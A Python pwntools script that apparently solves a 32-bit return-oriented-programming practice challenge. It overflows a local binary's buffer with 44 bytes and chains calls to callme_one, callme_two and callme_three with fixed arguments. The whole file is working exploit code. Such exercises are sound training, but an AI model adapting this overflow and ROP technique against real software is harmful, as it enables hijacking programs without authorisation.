from pwn import *

filename = sys.argv[1]

p = process(filename)

elf = ELF(filename)

callme_one = 0x080485c0
callme_two = 0x08048620
callme_three = 0x080485b0
exit_func = 0x08048848
clean_stack = 0x080488a9

ret = p32(callme_one)
ret += p32(clean_stack)
ret += p32(0x1)
ret += p32(0x2)
ret += p32(0x3)
ret += p32(callme_two)
ret += p32(clean_stack)
ret += p32(0x1)
ret += p32(0x2)
ret += p32(0x3)
ret += p32(callme_three)
ret += p32(clean_stack)
ret += p32(0x1)
ret += p32(0x2)
ret += p32(0x3)
ret += p32(exit_func)

payload = ''
payload += 'A'*44
payload += ret

output = p.recvuntil('> ')
print(output)

p.sendline(payload)

output = p.recv()
print(output)
